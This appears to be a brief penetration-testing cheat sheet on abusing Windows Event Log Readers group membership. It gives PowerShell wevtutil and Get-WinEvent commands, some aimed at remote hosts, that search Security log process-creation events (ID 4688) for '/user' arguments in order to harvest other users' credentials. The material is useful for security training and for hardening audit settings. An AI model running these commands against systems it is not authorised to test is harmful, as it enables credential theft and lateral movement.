# Exploiting Event Log Readers Group for Security Log Access

## Verify Group Membership

```powershell
net localgroup "Event Log Readers"
```

## Identify Audit Settings

Check whether process creation auditing (Event ID 4688) and command-line logging are enabled.

## Query Security Logs with `wevtutil`

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

```powershell
wevtutil qe Security /rd:true /f:text /r:<remote_host> /u:<user> /p:<password> | findstr "/user"
```

## Query Security Logs with `Get-WinEvent`

```powershell
Get-WinEvent -LogName Security |
    Where-Object { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' }
```

```powershell
Get-WinEvent -LogName Security -Credential <PSCredential> |
    Where-Object { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' }
```

## Explore PowerShell Operational Logs

Review the *PowerShell Operational* log for script block logging or module logging events.
